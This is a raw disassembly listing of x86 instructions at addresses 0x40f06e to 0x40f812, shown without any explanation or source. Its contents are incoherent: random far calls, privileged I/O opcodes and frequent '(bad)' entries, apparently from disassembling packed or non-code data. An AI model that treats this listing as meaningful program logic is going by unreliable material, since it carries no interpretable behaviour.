  40f06e:	xor    DWORD PTR [ebx-0xe53a454],ebx
  40f074:	sbb    al,0xe4
  40f076:	sti    
  40f077:	mov    dh,0x84
  40f079:	imul   edi,DWORD PTR [eax],0x3e
  40f07c:	sbb    eax,0xc0aff22f
  40f081:	adc    dh,bl
  40f083:	mov    edx,0xd8cee956
  40f088:	lock mov esi,0xfe672244
  40f08e:	xchg   ebx,eax
  40f08f:	lock call 0x4bc53acd
  40f095:	inc    esp
  40f096:	mov    ch,0xbc
  40f098:	dec    esp
  40f099:	push   es
  40f09a:	frstor [bx-0x5b]
  40f09e:	mov    esp,0xbf3589fc
  40f0a3:	mov    ds:0x8d8b116d,al
  40f0a8:	mov    ebx,0x8b35762c
  40f0ad:	out    dx,eax
  40f0ae:	lds    edx,FWORD PTR [ecx+0xdf84abe]
  40f0b4:	mov    edi,0xc136d631
  40f0b9:	fld    TBYTE PTR [edi]
  40f0bb:	add    edi,DWORD PTR [eax]
  40f0bd:	int    0xe9
  40f0bf:	cdq    
  40f0c0:	repnz or BYTE PTR [eax],al
  40f0c3:	leave  
  40f0c4:	or     DWORD PTR [ecx+eax*1],0xffffffd8
  40f0c8:	xor    al,0x6f
  40f0ca:	(bad)  
  40f0cb:	out    0x48,al
  40f0cd:	arpl   WORD PTR [eax+eax*2+0x7941ca],si
  40f0d4:	inc    esp
  40f0d5:	add    DWORD PTR es:0x87c2ec6b,eax
  40f0dc:	mov    eax,fs:0xdf33b32
  40f0e2:	in     al,0x61
  40f0e4:	test   ch,0x3e
  40f0e7:	mov    bh,0x7b
  40f0e9:	sbb    ecx,DWORD PTR [esi+0x72]
  40f0ec:	mov    ch,0x3f
  40f0ee:	dec    ecx
  40f0ef:	sbb    esp,edi
  40f0f1:	or     DWORD PTR [ebx+0x6e4a685a],esi
  40f0f7:	jp     0x40f079
  40f0f9:	dec    edi
  40f0fa:	sbb    al,0x3f
  40f0fc:	pop    ebp
  40f0fd:	jnp    0x40f0de
  40f0ff:	fcom   DWORD PTR [ebp+0x2d]
  40f102:	cmp    edx,DWORD PTR [esi-0x60158247]
  40f108:	shl    DWORD PTR [ebp+0x69],0x4e
  40f10c:	gs sbb al,0xd8
  40f10f:	or     esi,DWORD PTR [esi+0x25083d3f]
  40f115:	lock sub esi,DWORD PTR [edx-0x42]
  40f119:	cmc    
  40f11a:	fisttp DWORD PTR [eax]
  40f11c:	loopne 0x40f17a
  40f11e:	adc    edi,eax
  40f120:	daa    
  40f121:	pop    ds
  40f122:	fcomi  st,st(5)
  40f124:	or     eax,DWORD PTR [eax+0x2a]
  40f127:	or     bl,BYTE PTR [edx]
  40f129:	jnp    0x40f129
  40f12b:	cwde   
  40f12c:	and    DWORD PTR [esi+0x27799341],esp
  40f132:	in     al,dx
  40f133:	out    0xc2,eax
  40f135:	push   0x2f4a346e
  40f13a:	ins    DWORD PTR es:[edi],dx
  40f13b:	jbe    0x40f16b
  40f13d:	lods   eax,DWORD PTR ds:[esi]
  40f13e:	mov    ds:0x78935682,al
  40f143:	stos   BYTE PTR es:[edi],al
  40f144:	int    0x25
  40f146:	cld    
  40f147:	xor    dh,cl
  40f149:	hlt    
  40f14a:	push   esi
  40f14b:	cld    
  40f14c:	sub    DWORD PTR [ebx+0x5265ef00],eax
  40f152:	mov    ch,BYTE PTR [ebx-0x64]
  40f155:	mov    esp,0x9b21d88f
  40f15a:	sub    al,0xd9
  40f15c:	out    dx,eax
  40f15d:	in     al,dx
  40f15e:	push   ebp
  40f15f:	imul   ecx,DWORD PTR [eax+edx*8-0x57c924db],0x13a6e548
  40f16a:	sbb    cl,BYTE PTR [edi]
  40f16c:	cdq    
  40f16d:	adc    BYTE PTR ds:0x481444aa,dl
  40f173:	repnz adc eax,0x7098249e
  40f179:	ja     0x40f1d3
  40f17b:	push   eax
  40f17c:	cdq    
  40f17d:	pusha  
  40f17e:	popf   
  40f17f:	call   0xb902f835
  40f184:	push   eax
  40f185:	mov    eax,0x85a19ece
  40f18a:	int3   
  40f18b:	adc    BYTE PTR [ebx-0x18],dl
  40f18e:	ret    
  40f18f:	loopne 0x40f15b
  40f191:	int3   
  40f192:	mov    al,0x67
  40f194:	into   
  40f195:	add    BYTE PTR [eax+0x23c1e08b],cl
  40f19b:	aaa    
  40f19c:	and    edi,DWORD PTR [edi]
  40f19e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f19f:	data16 mov ah,0x55
  40f1a2:	pmaxsw mm2,QWORD PTR [ebx+0x6e]
  40f1a6:	iret   
  40f1a7:	(bad)  
  40f1a8:	ins    DWORD PTR es:[edi],dx
  40f1a9:	fiadd  DWORD PTR [esp+edx*8]
  40f1ac:	and    BYTE PTR [ecx],0x56
  40f1af:	mov    WORD PTR ds:0x9ad874fd,?
  40f1b5:	popf   
  40f1b6:	xlat   BYTE PTR ds:[ebx]
  40f1b7:	pop    ebx
  40f1b8:	adc    eax,0xf802540
  40f1bd:	shr    BYTE PTR [edi+0x1195329c],1
  40f1c3:	ret    
  40f1c4:	mov    BYTE PTR [ebx-0x3ef0fe7f],bl
  40f1ca:	mov    dh,0x6f
  40f1cc:	call   0xc562:0x4cc00107
  40f1d3:	mov    BYTE PTR [ebp+0x2fd558a4],al
  40f1d9:	rcr    BYTE PTR [edi],0x0
  40f1dc:	xor    DWORD PTR [eax-0x2f117d7a],eax
  40f1e2:	dec    esp
  40f1e3:	add    eax,0x82fb5ee7
  40f1e8:	xchg   ebp,eax
  40f1e9:	pop    ecx
  40f1ea:	adc    al,0xf1
  40f1ec:	sub    bl,BYTE PTR [edi-0x79399484]
  40f1f2:	ja     0x40f18f
  40f1f4:	mov    esp,0xce329d3b
  40f1f9:	adc    bl,dl
  40f1fb:	push   cs
  40f1fc:	(bad)  
  40f1fd:	sbb    DWORD PTR [eax+0x1],edi
  40f200:	and    eax,0xb21fcb1a
  40f205:	mov    al,ds:0x712364df
  40f20a:	lods   eax,DWORD PTR ds:[esi]
  40f20b:	sub    DWORD PTR [esi],ebp
  40f20d:	push   es
  40f20e:	mov    esp,0xfb819752
  40f213:	mov    esp,0x243af30d
  40f218:	retf   0xe901
  40f21b:	add    dh,BYTE PTR [edi]
  40f21d:	aas    
  40f21e:	and    al,0x51
  40f220:	pop    eax
  40f221:	test   DWORD PTR [ecx+0x6b713dde],ecx
  40f227:	xor    BYTE PTR [ebx+0x6cdf68d4],bh
  40f22d:	add    eax,0x82851960
  40f232:	lods   eax,DWORD PTR ds:[esi]
  40f233:	(bad)  
  40f234:	ds xchg ebp,eax
  40f236:	(bad)  
  40f237:	les    ecx,FWORD PTR [ebp+0x1b]
  40f23a:	xchg   ecx,eax
  40f23b:	lds    edx,FWORD PTR [ebx-0x58]
  40f23e:	sbb    BYTE PTR ds:0x4a130201,bh
  40f244:	ror    DWORD PTR [eax+0x3611a95b],cl
  40f24a:	adc    eax,0xd5170c45
  40f24f:	enter  0x247e,0x11
  40f253:	jge    0x40f2ab
  40f255:	or     edi,ecx
  40f257:	enter  0x12d8,0x35
  40f25b:	in     eax,dx
  40f25c:	sub    al,0xf0
  40f25e:	push   es
  40f25f:	sar    BYTE PTR [eax-0x32d6e0e1],0x3d
  40f266:	and    BYTE PTR cs:[ebp-0x22],0x23
  40f26b:	jmp    0xed02905c
  40f270:	adc    esp,DWORD PTR [edx+esi*1+0x53ba56e]
  40f277:	jg     0x40f2f4
  40f279:	and    eax,0x300031ca
  40f27e:	dec    ecx
  40f27f:	fdivr  QWORD PTR cs:[edx+0x7ca3f257]
  40f286:	loop   0x40f2e4
  40f288:	sub    DWORD PTR [edi+0x47cabb73],0xffffffcf
  40f28f:	jmp    0x40f2a3
  40f291:	test   eax,0x9d60f52e
  40f296:	mov    dl,0xe8
  40f298:	add    edx,edi
  40f29a:	(bad)  
  40f29b:	in     eax,dx
  40f29c:	imul   edx,DWORD PTR [ebx+0x5aa1f59e],0x2c
  40f2a3:	ret    
  40f2a4:	aaa    
  40f2a5:	pop    esi
  40f2a6:	scas   eax,DWORD PTR es:[edi]
  40f2a7:	stos   DWORD PTR es:[edi],eax
  40f2a8:	stc    
  40f2a9:	fnstsw WORD PTR [ecx-0x76]
  40f2ac:	int3   
  40f2ad:	ret    
  40f2ae:	je     0x40f32a
  40f2b0:	push   0x1f
  40f2b2:	adc    DWORD PTR [eax],ebx
  40f2b4:	addr16 popf 
  40f2b6:	rcr    BYTE PTR [edi+0x6892ec2d],0xc4
  40f2bd:	jg     0x40f279
  40f2bf:	adc    BYTE PTR [ebx],dh
  40f2c1:	cs addr16 pop esp
  40f2c4:	and    cl,BYTE PTR [edx+ebp*1+0x72]
  40f2c8:	out    dx,eax
  40f2c9:	je     0x40f289
  40f2cb:	mov    esi,0xd18cd259
  40f2d0:	and    BYTE PTR cs:0xd89d2faf,0xf4
  40f2d8:	adc    eax,0x88f6206c
  40f2dd:	mov    dh,0xd0
  40f2df:	test   DWORD PTR [eax-0x2a7813e],eax
  40f2e5:	ins    BYTE PTR es:[edi],dx
  40f2e6:	sub    al,0x4d
  40f2e8:	jne    0x40f30d
  40f2ea:	push   cs
  40f2eb:	pcmpgtd mm1,QWORD PTR [edx-0x4d]
  40f2ef:	mov    ch,0xbc
  40f2f1:	pushf  
  40f2f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2f3:	push   0x68
  40f2f5:	adc    eax,0xa3c26c8e
  40f2fa:	sub    eax,esp
  40f2fc:	test   DWORD PTR [eax-0x45],eax
  40f2ff:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f301:	pop    edi
  40f302:	jo     0x40f303
  40f304:	xchg   ecx,eax
  40f305:	jnp    0x40f35c
  40f307:	add    eax,0x9c79a08f
  40f30c:	pop    esi
  40f30d:	push   esp
  40f30e:	mov    WORD PTR [eax],es
  40f310:	(bad)  
  40f312:	scas   al,BYTE PTR es:[edi]
  40f313:	add    DWORD PTR [ebx+0x364f1677],ebx
  40f319:	push   ecx
  40f31a:	mov    dl,0xff
  40f31c:	cmp    eax,0xd84203cf
  40f321:	add    eax,DWORD PTR [ebp-0x2c094a0]
  40f327:	jnp    0x40f2dd
  40f329:	pushf  
  40f32a:	std    
  40f32b:	push   esi
  40f32c:	iret   
  40f32d:	out    0x5a,eax
  40f32f:	stc    
  40f330:	gs pop esp
  40f332:	sahf   
  40f333:	mov    DWORD PTR ss:[edi-0x2e5086a9],ecx
  40f33a:	add    eax,0x27a97620
  40f33f:	cs ret 0x1a1d
  40f343:	cmc    
  40f344:	xor    eax,0x7e08bb2b
  40f349:	mov    dh,0x4b
  40f34b:	jb     0x40f368
  40f34d:	mov    esp,0xf0294006
  40f352:	dec    ebx
  40f353:	popf   
  40f354:	shr    DWORD PTR [ebp+0x7a1c3c26],cl
  40f35a:	(bad)  
  40f35b:	xchg   ecx,eax
  40f35c:	mov    ecx,0xb946a32d
  40f361:	aam    0x65
  40f363:	push   cs
  40f364:	mov    dl,0x9
  40f366:	push   esp
  40f367:	cmp    eax,0x24b1a1ee
  40f36c:	stos   BYTE PTR es:[edi],al
  40f36d:	jno    0x40f33b
  40f36f:	hlt    
  40f370:	in     eax,dx
  40f371:	push   ebx
  40f372:	jecxz  0x40f3a2
  40f374:	sub    BYTE PTR [esi],dh
  40f376:	add    al,0xce
  40f378:	xchg   esp,eax
  40f379:	repz lea eax,[edx]
  40f37c:	icebp  
  40f37d:	call   0xaaf7:0x52a71a73
  40f384:	sbb    al,0x7
  40f386:	ficomp WORD PTR [ebp+0x16]
  40f389:	cli    
  40f38a:	xor    eax,0xc851dd
  40f38f:	jle    0x40f348
  40f391:	aam    0x92
  40f393:	sar    BYTE PTR [ebx+ebx*4],cl
  40f396:	lds    ebx,FWORD PTR [ebx+0x16]
  40f399:	(bad)  
  40f39a:	jne    0x40f331
  40f39c:	call   0x95d9311f
  40f3a1:	jle    0x40f3c8
  40f3a3:	sar    ah,cl
  40f3a5:	jnp    0x40f395
  40f3a7:	scas   al,BYTE PTR es:[edi]
  40f3a8:	add    DWORD PTR [ecx],edx
  40f3aa:	ficom  WORD PTR [ecx]
  40f3ac:	popf   
  40f3ad:	push   edx
  40f3ae:	ficomp DWORD PTR [ebp-0x7724f23a]
  40f3b4:	add    dl,BYTE PTR [ebp+0x13]
  40f3b7:	push   0x11b12f5b
  40f3bc:	sbb    BYTE PTR [edx],cl
  40f3be:	(bad)  
  40f3bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3c1:	sub    al,0xd
  40f3c3:	loopne 0x40f3be
  40f3c5:	mov    DWORD PTR [esi+ebp*1-0x6c],esp
  40f3c9:	int    0xc5
  40f3cb:	push   ebx
  40f3cc:	jne    0x40f44d
  40f3ce:	daa    
  40f3cf:	and    eax,0x655226a2
  40f3d4:	dec    eax
  40f3d5:	fsub   QWORD PTR [ecx]
  40f3d7:	xchg   al,ch
  40f3d9:	imul   ecx,DWORD PTR [esp+edi*1+0x39],0x5
  40f3de:	adc    BYTE PTR [ecx+0x151588c],bh
  40f3e4:	(bad)  
  40f3e5:	push   0x2417e833
  40f3ea:	and    ebx,ebp
  40f3ec:	sub    al,BYTE PTR [ecx+0x1c86f082]
  40f3f2:	lods   al,BYTE PTR ds:[esi]
  40f3f3:	add    BYTE PTR [ecx-0x3482f665],cl
  40f3f9:	js     0x40f40b
  40f3fb:	pop    esi
  40f3fc:	aam    0x5
  40f3fe:	jp     0x40f3d8
  40f400:	push   ecx
  40f401:	ins    DWORD PTR es:[edi],dx
  40f402:	sub    dh,BYTE PTR [edx+0x6b7c5963]
  40f408:	inc    esp
  40f409:	jmp    0x46bbeec9
  40f40e:	cmp    DWORD PTR [edi],eax
  40f410:	int    0x91
  40f412:	and    bl,BYTE PTR [eax-0x9]
  40f415:	retf   
  40f416:	arpl   WORD PTR [eax+ecx*1],sp
  40f419:	mov    al,0xdf
  40f41b:	sahf   
  40f41c:	std    
  40f41d:	xchg   edi,eax
  40f41e:	push   ebp
  40f41f:	inc    edx
  40f420:	add    ebx,DWORD PTR [ebp+0x1]
  40f423:	nop
  40f424:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f425:	mov    edi,0x6ba3f01a
  40f42a:	pop    es
  40f42b:	pop    ecx
  40f42c:	sbb    al,0xf
  40f42e:	or     ch,BYTE PTR [edi-0x33deffa2]
  40f434:	aas    
  40f435:	mov    edi,0x786732f6
  40f43a:	mov    edx,0x18a9c116
  40f43f:	add    eax,DWORD PTR [edx+0x76]
  40f442:	push   eax
  40f443:	adc    ebp,DWORD PTR [edi+0x36c9e708]
  40f449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f44a:	loopne 0x40f3ed
  40f44c:	shr    BYTE PTR [esi+0x37],1
  40f44f:	jecxz  0x40f3ed
  40f451:	(bad)  
  40f452:	cmp    ch,BYTE PTR [ecx]
  40f454:	jge    0x40f4be
  40f456:	lahf   
  40f457:	mov    ah,0xa0
  40f459:	sahf   
  40f45a:	push   eax
  40f45b:	into   
  40f45c:	push   edi
  40f45d:	mov    edi,0x6248e3ec
  40f462:	fmul   DWORD PTR [esi+0x2a3b031d]
  40f468:	lods   eax,DWORD PTR ds:[esi]
  40f469:	or     al,0x1a
  40f46b:	mov    eax,ds:0xbe588a44
  40f470:	or     bl,BYTE PTR [eax+0xc13150c]
  40f476:	cmp    al,0x34
  40f478:	adc    dh,0x4f
  40f47b:	enter  0xb09c,0xa9
  40f47f:	call   0x1d49:0xef04d1d9
  40f486:	rcl    DWORD PTR [edi+edx*8-0x43],1
  40f48a:	or     al,0x19
  40f48c:	imul   esi,eax,0x3edbef56
  40f492:	(bad)  
  40f494:	int3   
  40f495:	fcmovne st,st(1)
  40f497:	dec    ebx
  40f498:	sbb    ebp,DWORD PTR [bx+di+0x34]
  40f49c:	dec    eax
  40f49d:	push   edx
  40f49e:	add    DWORD PTR [esi],ebx
  40f4a0:	rol    esi,0xe3
  40f4a3:	(bad)  
  40f4a4:	repz call 0x1616:0xad58e5d5
  40f4ac:	adc    dh,BYTE PTR [esp+ebx*8-0x7d3147d1]
  40f4b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4b4:	mov    cl,0x7d
  40f4b6:	in     al,0xf7
  40f4b8:	or     BYTE PTR ds:0x17819c13,dh
  40f4be:	inc    edi
  40f4bf:	mov    dh,0xec
  40f4c1:	jmp    FWORD PTR [edx-0x606d92c4]
  40f4c7:	mov    edx,0x7670e0ad
  40f4cc:	popa   
  40f4cd:	scas   al,BYTE PTR es:[edi]
  40f4ce:	mov    cl,0x9d
  40f4d0:	loope  0x40f517
  40f4d2:	xor    al,0x1
  40f4d4:	and    BYTE PTR [eax+0x2106fb92],ah
  40f4da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4db:	popa   
  40f4dc:	adc    eax,0x8a468ee9
  40f4e1:	cvtdq2ps xmm0,XMMWORD PTR [edi+0xf33e240]
  40f4e8:	int3   
  40f4e9:	push   ds
  40f4ea:	pop    ebp
  40f4eb:	(bad)  
  40f4ed:	stos   DWORD PTR es:[edi],eax
  40f4ee:	lahf   
  40f4ef:	test   DWORD PTR [edx-0x4701a427],ebx
  40f4f5:	je     0x40f528
  40f4f7:	and    al,0xb1
  40f4f9:	int    0xe
  40f4fb:	cmp    al,0x2f
  40f4fd:	iret   
  40f4fe:	dec    ebp
  40f4ff:	jmp    0xcb3b5a1b
  40f504:	jne    0x40f4f3
  40f506:	lods   al,BYTE PTR ds:[esi]
  40f507:	pop    edi
  40f508:	dec    ebp
  40f509:	adc    ebx,esi
  40f50b:	cwde   
  40f50c:	bound  edi,QWORD PTR [esi+0x53736a73]
  40f512:	jbe    0x40f4fd
  40f514:	into   
  40f515:	js     0x40f54a
  40f517:	inc    esi
  40f518:	inc    ebx
  40f519:	mov    eax,ds:0x91eb3b2
  40f51e:	loopne 0x40f4a8
  40f520:	or     esp,DWORD PTR [eax+0x8]
  40f523:	add    eax,0x3ea18c48
  40f528:	mov    ebp,ebp
  40f52a:	xor    ebp,DWORD PTR [ebp-0x5c7d58f3]
  40f530:	ss aam 0xd0
  40f533:	xchg   DWORD PTR [ebp+0x3811c901],ebx
  40f539:	rol    cl,0xf2
  40f53c:	imul   edi,edx,0xbf53aba4
  40f542:	mov    ch,0xcf
  40f544:	cli    
  40f545:	ret    0x57a7
  40f548:	push   esp
  40f549:	loope  0x40f566
  40f54b:	arpl   WORD PTR [esi*2-0x680f3b19],dx
  40f552:	mov    cl,0x95
  40f554:	ins    DWORD PTR es:[edi],dx
  40f555:	cmp    BYTE PTR [edi],bl
  40f557:	pop    ebp
  40f558:	push   0x4de33078
  40f55d:	or     DWORD PTR [edi-0x2d402c6a],esp
  40f563:	inc    edi
  40f564:	lds    esi,FWORD PTR [eax+0x7f671b2d]
  40f56a:	cmp    dl,al
  40f56c:	fdiv   QWORD PTR [eax+eiz*8+0x22]
  40f570:	lea    esp,[esi-0x2bf0372d]
  40f576:	and    dh,BYTE PTR ds:0x3f92e060
  40f57c:	inc    edi
  40f57d:	(bad)  
  40f57e:	mov    esi,0xc8930e0f
  40f583:	sti    
  40f584:	out    0xf7,al
  40f586:	stos   DWORD PTR es:[edi],eax
  40f587:	jne    0x40f57d
  40f589:	shl    esi,0x8
  40f58c:	inc    esi
  40f58d:	or     bh,BYTE PTR [edx+0x7b]
  40f590:	icebp  
  40f591:	mov    al,ds:0xa763555f
  40f596:	xchg   ecx,eax
  40f597:	inc    ebp
  40f598:	data16 test al,0x2
  40f59b:	push   ds
  40f59c:	cmp    esp,DWORD PTR [edx+esi*1]
  40f59f:	adc    edx,DWORD PTR [eax]
  40f5a1:	fsubr  DWORD PTR [eax+0x3]
  40f5a4:	jge    0x40f56f
  40f5a6:	or     ebx,DWORD PTR [edi]
  40f5a8:	ret    
  40f5a9:	sbb    DWORD PTR [edi],ebx
  40f5ab:	mov    esp,0xa9337505
  40f5b0:	xor    DWORD PTR [esi-0x1736257b],ebp
  40f5b6:	or     edi,DWORD PTR [eax+0x3442df51]
  40f5bc:	and    dh,BYTE PTR [ebx]
  40f5be:	adc    dl,BYTE PTR [ebx-0xa]
  40f5c1:	(bad)  
  40f5c2:	push   ebp
  40f5c3:	add    BYTE PTR [ecx],0x4c
  40f5c6:	dec    ebx
  40f5c7:	add    edx,DWORD PTR [ebx+ebp*8-0x35]
  40f5cb:	xchg   edi,eax
  40f5cc:	sbb    al,0x3e
  40f5ce:	xchg   DWORD PTR [esi+0x62fe1eb9],ecx
  40f5d4:	int    0x2c
  40f5d6:	lods   eax,DWORD PTR ds:[esi]
  40f5d7:	jo     0x40f56c
  40f5d9:	leave  
  40f5da:	and    ecx,DWORD PTR [ebx+ebp*4-0x60]
  40f5de:	add    al,0xac
  40f5e0:	mov    edi,0x121643f6
  40f5e5:	jmp    0x4c39:0x652b3a20
  40f5ec:	(bad)  
  40f5ee:	inc    ecx
  40f5ef:	add    ecx,edx
  40f5f1:	inc    edi
  40f5f2:	cmp    ah,BYTE PTR [eax]
  40f5f4:	aas    
  40f5f5:	lock push ecx
  40f5f7:	fmul   QWORD PTR [eax-0x797e96c4]
  40f5fd:	stos   DWORD PTR es:[edi],eax
  40f5fe:	loop   0x40f63b
  40f600:	jno    0x40f629
  40f602:	inc    eax
  40f603:	adc    DWORD PTR [ebx-0x8],esi
  40f606:	jl     0x40f673
  40f608:	fsubr  st(0),st
  40f60a:	or     eax,0xbdb71259
  40f60f:	cmp    esp,eax
  40f611:	adc    BYTE PTR [ebp+0x44cc1373],bl
  40f617:	shr    DWORD PTR [eax],cl
  40f619:	sti    
  40f61a:	mov    dl,0x40
  40f61c:	test   ebp,edi
  40f61e:	jg     0x40f5e3
  40f620:	ret    
  40f621:	(bad)  
  40f622:	sub    esi,DWORD PTR [edi-0x57]
  40f625:	call   0x3aa4ea75
  40f62a:	sub    esi,esi
  40f62c:	sti    
  40f62d:	mov    ah,0x79
  40f62f:	cli    
  40f630:	test   DWORD PTR [edi+0x60ff831f],ecx
  40f636:	outs   dx,DWORD PTR ds:[esi]
  40f637:	fmul   QWORD PTR [eax+0x69c290fb]
  40f63d:	mov    ah,0x97
  40f63f:	add    DWORD PTR [esi+0x5fb7417],eax
  40f645:	push   cs
  40f646:	std    
  40f647:	ins    BYTE PTR es:[edi],dx
  40f648:	and    DWORD PTR [ebx-0x7d839f2c],0x8d009564
  40f652:	ins    BYTE PTR es:[edi],dx
  40f653:	push   0x9
  40f655:	sbb    eax,0xf790130c
  40f65a:	push   0xffffffc9
  40f65c:	stos   BYTE PTR es:[edi],al
  40f65d:	or     ecx,0x35
  40f660:	jnp    0x40f6cb
  40f662:	sub    eax,0x4da065e2
  40f667:	add    eax,0x828c11b4
  40f66c:	inc    ecx
  40f66d:	pop    es
  40f66e:	mov    gs,WORD PTR ds:0xe2eeea3c
  40f674:	(bad)  
  40f675:	push   ds
  40f676:	pop    es
  40f677:	dec    edi
  40f678:	jbe    0x40f623
  40f67a:	hlt    
  40f67b:	repnz (bad) 
  40f67d:	popa   
  40f67e:	pop    edi
  40f67f:	jb     0x40f675
  40f681:	mov    edx,0xab5e875e
  40f686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f687:	mov    ch,0x77
  40f689:	out    dx,al
  40f68a:	dec    edx
  40f68b:	out    dx,al
  40f68c:	mov    ebp,0x149671b1
  40f691:	lods   al,BYTE PTR ds:[esi]
  40f692:	popf   
  40f693:	into   
  40f694:	arpl   WORD PTR [edx],sp
  40f696:	ja     0x40f6f8
  40f698:	xor    DWORD PTR [ebp+0x62cf7d56],ebp
  40f69e:	pushf  
  40f69f:	pop    ds
  40f6a0:	and    esi,DWORD PTR [eax+0x7fe5844a]
  40f6a6:	push   edi
  40f6a7:	push   ds
  40f6a8:	xchg   esp,eax
  40f6a9:	out    dx,al
  40f6aa:	ficom  DWORD PTR [eax]
  40f6ac:	int3   
  40f6ad:	pop    ebx
  40f6ae:	sbb    ebp,edx
  40f6b0:	sbb    DWORD PTR [edi],eax
  40f6b2:	aaa    
  40f6b3:	(bad)
  40f6b6:	or     DWORD PTR [ebp-0x4c7e535f],esi
  40f6bc:	jle    0x40f6d5
  40f6be:	loope  0x40f659
  40f6c0:	cmp    DWORD PTR [esp+esi*8],edi
  40f6c3:	sub    bh,BYTE PTR [ecx]
  40f6c5:	pop    es
  40f6c6:	fild   WORD PTR [edx+0x3e]
  40f6c9:	icebp  
  40f6ca:	enter  0x77f7,0x19
  40f6ce:	imul   edx,DWORD PTR [esi+0x7ab62847],0x7c
  40f6d5:	pop    esi
  40f6d6:	js     0x40f661
  40f6d8:	or     DWORD PTR [edi+ebx*1],0xfffffffe
  40f6dc:	call   0x3357d5d2
  40f6e1:	push   es
  40f6e2:	add    ebx,ebp
  40f6e4:	pop    ds
  40f6e5:	lea    esp,[esi-0x301f3e90]
  40f6eb:	lahf   
  40f6ec:	dec    edx
  40f6ed:	push   edx
  40f6ee:	fdiv   DWORD PTR [edi+0x48099478]
  40f6f4:	add    al,0xa4
  40f6f6:	stc    
  40f6f7:	(bad)  gs:[eax+esi*1]
  40f6fb:	sbb    edi,ebx
  40f6fd:	jge    0x40f6e9
  40f6ff:	adc    edx,DWORD PTR [edi+0xc2ae83]
  40f705:	loope  0x40f6a3
  40f707:	(bad)  
  40f708:	jnp    0x40f719
  40f70a:	jle    0x40f701
  40f70c:	xor    DWORD PTR [eax+0x6eada61d],eax
  40f712:	test   al,0xcc
  40f714:	in     al,0xd
  40f716:	jne    0x40f77f
  40f718:	ret    0xf6c9
  40f71b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f71c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f71d:	mov    dl,0xcb
  40f71f:	pop    ebx
  40f720:	and    al,0x4f
  40f722:	mov    ebx,0xa3347cbb
  40f727:	nop
  40f728:	(bad)  [ecx+edi*1+0x34]
  40f72c:	jecxz  0x40f7a0
  40f72e:	inc    edi
  40f72f:	mov    esi,0x8e482055
  40f734:	fisub  WORD PTR [esi+0x63]
  40f737:	std    
  40f738:	iret   
  40f739:	call   0x5553:0x2918d4eb
  40f740:	and    ah,BYTE PTR [ecx+0x58054b94]
  40f746:	xor    DWORD PTR [ebx],ecx
  40f748:	mov    edi,DWORD PTR [ebx*2-0x44c88e13]
  40f74f:	push   cs
  40f750:	hlt    
  40f751:	jno    0x40f7b5
  40f753:	push   ecx
  40f754:	dec    ecx
  40f755:	lock push edi
  40f757:	aad    0xd5
  40f759:	xchg   edi,eax
  40f75a:	mov    esp,0x1e1b673f
  40f75f:	je     0x40f70d
  40f761:	retf   0x4487
  40f764:	cs xchg esi,eax
  40f766:	repz aaa 
  40f768:	push   0x55f91b53
  40f76d:	push   ebx
  40f76e:	test   ecx,ecx
  40f770:	dec    ebp
  40f771:	lds    edi,FWORD PTR [eax+0x4eeb17e0]
  40f777:	gs popf 
  40f779:	and    eax,0xe60962a4
  40f77e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f77f:	mov    bh,0x61
  40f781:	pop    eax
  40f782:	cmp    dl,BYTE PTR [eax]
  40f784:	sbb    esi,ecx
  40f786:	or     BYTE PTR [eax-0x71],0xd
  40f78a:	popf   
  40f78b:	adc    bl,BYTE PTR [ebx-0x29170f95]
  40f791:	pusha  
  40f792:	pop    eax
  40f793:	xchg   DWORD PTR [ecx],esp
  40f795:	xchg   DWORD PTR [edx-0x71ac5b8d],esp
  40f79b:	test   edx,ebp
  40f79d:	cs lahf 
  40f79f:	dec    ecx
  40f7a0:	iret   
  40f7a1:	push   edi
  40f7a2:	sbb    bl,BYTE PTR [esi+0xfa1f281]
  40f7a8:	fisubr WORD PTR [edi]
  40f7aa:	data16 stc 
  40f7ac:	ret    
  40f7ad:	js     0x40f74b
  40f7af:	fisttp DWORD PTR [edx]
  40f7b1:	inc    eax
  40f7b2:	ror    BYTE PTR [edx],cl
  40f7b4:	push   es
  40f7b5:	fdiv   DWORD PTR [eax]
  40f7b7:	sbb    dl,dl
  40f7b9:	(bad)  
  40f7ba:	or     al,0x55
  40f7bc:	std    
  40f7bd:	adc    ecx,DWORD PTR [eax+0x2052574a]
  40f7c3:	ins    BYTE PTR es:[edi],dx
  40f7c4:	out    0xf8,al
  40f7c6:	or     BYTE PTR [ebx],cl
  40f7c8:	xchg   esp,eax
  40f7c9:	test   al,0x66
  40f7cb:	mov    ah,0xe3
  40f7cd:	jnp    0x40f7ff
  40f7cf:	cwde   
  40f7d0:	pop    edx
  40f7d1:	push   esp
  40f7d2:	in     al,dx
  40f7d3:	jecxz  0x40f75e
  40f7d5:	inc    ebp
  40f7d6:	xchg   ebx,eax
  40f7d7:	or     ebp,ecx
  40f7d9:	fsubr  DWORD PTR [ebx*1+0x789b746]
  40f7e0:	or     cl,BYTE PTR [edi]
  40f7e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7e3:	mov    ecx,0xc6295f9
  40f7e8:	xchg   DWORD PTR [ebx],ebx
  40f7ea:	lahf   
  40f7eb:	call   0x27c3:0x4b178d27
  40f7f2:	fdiv   QWORD PTR [ebx-0x1bdc1901]
  40f7f8:	test   al,0x2c
  40f7fa:	dec    esp
  40f7fb:	inc    ecx
  40f7fc:	pop    eax
  40f7fd:	jge    0x40f77f
  40f7ff:	adc    eax,DWORD PTR [edx]
  40f801:	aam    0x37
  40f803:	hlt    
  40f804:	jp     0x40f7d8
  40f806:	(bad)  
  40f807:	loopne 0x40f7cd
  40f809:	pop    ds
  40f80a:	cmp    ch,dl
  40f80c:	add    ebx,DWORD PTR [esi+0x2addb895]
  40f812:	jb     0x40f7a5
